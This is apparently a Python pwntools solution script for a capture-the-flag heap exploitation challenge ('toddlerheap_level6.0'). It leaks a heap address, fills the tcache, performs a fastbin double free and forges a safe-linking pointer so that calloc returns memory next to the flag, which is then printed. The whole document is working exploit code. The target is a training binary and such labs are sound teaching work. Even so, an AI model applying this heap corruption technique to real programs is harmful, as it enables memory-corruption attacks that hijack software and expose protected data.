# fastbin_dup_into_stack, calloc to a region before flag, fill with A, leak flag

from pwn import *

malloc_size = 8

context.arch = 'amd64'
BINARY = "/challenge/toddlerheap_level6.0"
p = process(BINARY)

offset = 0x308

p.recvuntil(b"Reading the flag into ")
flag_loc = int(p.recvuntil(b'.')[:-1], 16)
print(f'flag_loc = {hex(flag_loc)}')


p.sendline(f"calloc 0 {malloc_size}")
p.sendline(f"free 0")
p.sendline(b"puts 0")
p.recvuntil(b"Data: ")
leak = p.recvuntil(b"\n")[:-1]
heap_leak = unpack(leak, 'all')
print(f'heap_leak = {hex(heap_leak)}')

# fill tcache
for idx in range(7):
    p.sendline(f"calloc {idx} {malloc_size}")
for idx in range(7):
    p.sendline(f"free {idx}")

#fastbin_dup_into_stack
for idx in range(2):
    p.sendline(f"calloc {idx} {malloc_size}")
p.sendline(b"free 0")
p.sendline(b"free 1")
p.sendline(b"free 0")

p.sendline(f"calloc 3 {malloc_size}")
p.sendline(f"calloc 4 {malloc_size}")

# write to flag_loc - offset
p.sendline(b"read_to_global")
p.sendline(b"16")
payload = p64(0) + p64(0x20)
p.send(payload)

# alloc to global
p.sendline("safer_read")
p.sendline(b"3")
p.sendline(p64(heap_leak ^ (flag_loc - offset)))
p.sendline(f"calloc 5 {malloc_size}")
p.sendline(f"calloc 6 {malloc_size}")

# fill the gap between gloabl and flag_loc
p.sendline(b"read_to_global")
p.sendline(str(offset).encode('utf-8'))
p.send(b'A'*offset)

p.sendline(b"puts 6")
print(p.clean().decode())